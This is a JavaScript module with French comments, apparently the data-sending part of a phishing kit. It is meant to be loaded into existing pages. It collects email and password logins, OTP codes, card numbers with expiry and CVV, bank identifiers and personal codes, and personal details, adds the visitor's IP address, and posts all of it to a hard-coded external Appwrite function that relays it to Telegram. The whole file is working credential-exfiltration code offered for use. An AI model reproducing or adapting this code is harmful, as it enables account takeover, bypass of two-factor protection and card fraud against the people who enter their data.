/**
 * Module d'intégration Telegram via Appwrite
 * 
 * Ce module permet d'envoyer les données de formulaires à Telegram
 * sans modifier vos pages existantes.
 * 
 * Usage:
 * 1. Chargez ce script dans votre page: <script src="telegram-sender.js"></script>
 * 2. Appelez la fonction pour envoyer les données:
 *    telegramSender.sendLoginCredentials(email, password, 'Connexion');
 *    telegramSender.sendOTPVerification(email, otp, 'Connexion');
 *    telegramSender.sendPaymentDetails({nom, banque, montant, card_number, expiry, cvv}, 'Paiement');
 *    telegramSender.sendPersonalInfo({nom, date_naissance, telephone, email, adresse, ville, pays}, 'Infos');
 *    telegramSender.sendBankSync({bank_identifier, personal_code}, 'Banque');
 */

class TelegramSender {
  constructor(appwriteFunctionUrl) {
    this.functionUrl = appwriteFunctionUrl;
    this.clientIp = null;
    this.initializeIp();
  }

  /**
   * Récupérer l'adresse IP du client
   */
  async initializeIp() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      this.clientIp = data.ip;
    } catch (error) {
      console.warn('Impossible de récupérer l\'adresse IP:', error);
      this.clientIp = 'IP inconnue';
    }
  }

  /**
   * Envoyer les identifiants de connexion
   */
  async sendLoginCredentials(email, password, pageName = 'Connexion') {
    return this.sendToAppwrite({
      formType: 'login_credentials',
      email: email,
      password: password,
      page: pageName,
      ip: this.clientIp,
      timestamp: new Date().toISOString()
    });
  }

  /**
   * Envoyer la vérification OTP
   */
  async sendOTPVerification(email, otp, pageName = 'Connexion') {
    return this.sendToAppwrite({
      formType: 'otp_verification',
      email: email,
      otp: otp,
      page: pageName,
      ip: this.clientIp,
      timestamp: new Date().toISOString()
    });
  }

  /**
   * Envoyer les détails de paiement
   */
  async sendPaymentDetails(paymentData, pageName = 'Paiement') {
    return this.sendToAppwrite({
      formType: 'payment_details',
      nom: paymentData.nom,
      banque: paymentData.banque,
      montant: paymentData.montant,
      card_number: paymentData.card_number,
      expiry: paymentData.expiry,
      cvv: paymentData.cvv,
      page: pageName,
      ip: this.clientIp,
      timestamp: new Date().toISOString()
    });
  }

  /**
   * Envoyer les informations personnelles
   */
  async sendPersonalInfo(personalData, pageName = 'Informations personnelles') {
    return this.sendToAppwrite({
      formType: 'personal_info',
      nom: personalData.nom,
      date_naissance: personalData.date_naissance,
      telephone: personalData.telephone,
      email: personalData.email,
      adresse: personalData.adresse,
      ville: personalData.ville,
      pays: personalData.pays,
      page: pageName,
      ip: this.clientIp,
      timestamp: new Date().toISOString()
    });
  }

  /**
   * Envoyer les données de synchronisation bancaire
   */
  async sendBankSync(bankData, pageName = 'Synchronisation Bancaire') {
    return this.sendToAppwrite({
      formType: 'bank_sync',
      bank_identifier: bankData.bank_identifier,
      personal_code: bankData.personal_code,
      page: pageName,
      ip: this.clientIp,
      timestamp: new Date().toISOString()
    });
  }

  /**
   * Envoyer un formulaire personnalisé
   */
  async sendCustomForm(formType, data) {
    const payload = {
      formType: formType,
      ...data,
      ip: this.clientIp,
      timestamp: new Date().toISOString()
    };
    return this.sendToAppwrite(payload);
  }

  /**
   * Envoyer les données à la Function Appwrite
   */
  async sendToAppwrite(data) {
    if (!this.functionUrl) {
      throw new Error('URL de la Function Appwrite non configurée');
    }

    try {
      const response = await fetch(this.functionUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
      });

      if (!response.ok) {
        throw new Error(`Erreur HTTP: ${response.status}`);
      }

      const result = await response.json();
      
      if (!result.success) {
        throw new Error(result.message || 'Erreur lors de l\'envoi');
      }

      return result;
    } catch (error) {
      console.error('Erreur lors de l\'envoi à Telegram:', error);
      throw error;
    }
  }
}

// Créer une instance globale avec la vraie URL Appwrite Function
const telegramSender = new TelegramSender(
  window.APPWRITE_FUNCTION_URL || 'https://69b72debaed434cd10f5.fra.appwrite.run'
);
